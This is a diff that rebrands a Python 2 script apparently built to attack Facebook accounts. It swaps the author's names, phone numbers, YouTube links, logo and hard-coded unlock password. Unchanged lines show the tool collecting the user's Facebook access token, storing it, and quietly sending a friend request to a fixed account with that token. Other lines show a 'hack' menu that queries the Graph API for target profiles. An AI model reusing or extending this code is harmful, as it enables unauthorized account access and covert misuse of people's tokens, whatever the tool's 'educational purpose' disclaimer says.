@@ -1,10 +1,10 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By Jam Shahrukh
+#Codded By: Mr.Atiq
 #Editing My Script Will Not Make You A Coder
-#Facebook : JAM Shahrukh
-#Whatsapp : ++971528752764
-#Pakistan Cyber Expert
+#YouTube  : Note Point
+#Whatsapp : +923414826359
+#Pakistani: Black Ranjha
 #Alone Coder 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -50,19 +50,45 @@ def jalan(z):
 		time.sleep(0.1)
 ##### INTRO #####
 logo ="""
+\x1b[1;94m_____      __         ______      ____       __  __     
+\x1b[1;94m/\  _`\    /\ \       /\  _  \    /\  _`\    /\ \/\ \    
+ \x1b[1;94m\ \ \L\ \  \ \ \      \ \ \L\ \   \ \ \/\_\  \ \ \/'/'   
+  \x1b[1;94m\ \  _ <'  \ \ \  __  \ \  __ \   \ \ \/_/_  \ \ , <    
+   \x1b[1;94m\ \ \L\ \  \ \ \L\ \  \ \ \/\ \   \ \ \L\ \  \ \ \\`\  
+    \x1b[1;94m\ \____/   \ \____/   \ \_\ \_\   \ \____/   \ \_\ \_\
+     \x1b[1;94m\/___/     \/___/     \/_/\/_/    \/___/     \/_/\/_/
+ ╔═══╗╔═══╗╔═╗─╔╗╔╗─╔╗╔═══╗
+║╔═╗║║╔═╗║║║╚╗║║──╔╗║║─║║║╔═╗║
+║╚═╝║║║─║║║╔╗╚╝║──║║║╚═╝║║║─║║
+║╔╗╔╝║╚═╝║║║╚╗║║──║║║╔═╗║║╚═╝║
+║║║╚╗║╔═╗║║║─║║║╔╗║║║║─║║║╔═╗║
+╚╝╚═╝╚╝─╚╝╚╝─╚═╝║╚╝║╚╝─╚╝╚╝─╚╝                                                         
+                                                          
+   \033[1;97m██░▀██████████████▀░██
+   \033[1;97m█▌▒▒░████████████░▒▒▐█
+   \033[1;97m█░▒▒▒░██████████░▒▒▒░█
+   \033[1;97m▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐ 
+   \033[1;97m░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
+  \033[1;97m███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██
+  \033[1;97m██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█
+  \033[1;97m▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌
+    \033[1;97m█░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█
+    \033[1;97m▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒
+   \033[1;97m░░░░░░░░░░└┴┘░░░░░░░░░
+   \033[1;97m██▄▄░░░░░░░░░░░░░░▄▄██
+   \033[1;97m████████▒▒▒▒▒▒████████
+   \033[1;97m█▀░░███▒▒░░▒░░▒▀██████
+   \033[1;97m█▒░███▒▒╖░░╥░░╓▒▐█████
+   \033[1;97m█▒░▀▀▀░░║░░║░░║░░█████
+   \033[1;97m██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███
+   \033[1;97m██████████████████████
 
-\x1b[1;96m░░░░░██╗░█████╗░███╗░░░███╗
-\x1b[1;96m░░░░░██║██╔══██╗████╗░████║
-\x1b[1;96m░░░░░██║███████║██╔████╔██║
-\x1b[1;96m██╗░░██║██╔══██║██║╚██╔╝██║
-\x1b[1;96m╚█████╔╝██║░░██║██║░╚═╝░██║
-\x1b[1;96m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
 \x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : JAM SHAHRUKH TECHNICAL
-\x1b[1;94m➣  Facebook : JAM SHAHRUKH
+\x1b[1;94m➣  YouTube  : NOTE POINT
+\x1b[1;94m➣  Name     : MR.ATIQ
 \x1b[1;94m➣  Note     : Dont ReEdit It 
-\x1b[1;94m➣  Github   : https://github.com/Jam302/King
-\x1b[1;94m➣  Whatsapp : +971528752764
+\x1b[1;94m➣  Github   : https://github.com/MRATIQ420
+\x1b[1;94m➣  Whatsapp : +923414826359
 \x1b[1;94m➣  Note     : Having Problem? Contact Me On Whatsapp.
 \x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only.
 \x1b[1;97m--------------------------------------------------------------"""
@@ -83,8 +109,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "786"
+CorrectPassword = "Ranjha"
 
 loop = 'true'
 while (loop == 'true'):
@@ -97,10 +123,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+            os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+        os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 def login():
 	os.system('clear')
 	try:
@@ -112,7 +138,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mJam King Of Facebook' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mBlack Ranjha Of Facebook' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -145,7 +171,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -210,7 +236,7 @@ def hop():
 	elif hack =="1":
 		super()
 	elif hack =="2":
-	        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 	        menu()
         
 	elif hack =="0":
@@ -291,7 +317,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam
+			pass #Dev:Black_Ranjha
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
